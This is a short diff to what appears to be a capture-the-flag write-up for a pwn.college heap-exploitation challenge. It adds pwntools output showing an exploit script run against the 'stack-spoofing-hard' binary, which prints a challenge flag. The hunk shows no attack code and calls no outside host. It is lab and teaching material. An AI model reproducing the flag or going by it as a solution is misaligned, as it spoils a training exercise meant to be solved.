@@ -6535,7 +6535,11 @@ print(p.recvall(timeout=3).decode())
 ```
 
 ```
-hacker@dynamic-allocator-misuse~stack-spoofing-hard:/$ python ~/script.py
+hacker@dynamic-allocator-misuse~stack-spoofing-hard:/$ python ~/script.py 
+[+] Starting local process '/challenge/stack-spoofing-hard': pid 101583
+[+] Receiving all data: Done (173B)
+[*] Stopped process '/challenge/stack-spoofing-hard' (pid 101583)
+
 You win! Here is your flag:
 pwn.college{UO-knMx2TfsXlZ5xVxHIS2Fcp-x.0FN5MDL4ITM0EzW}
 ```
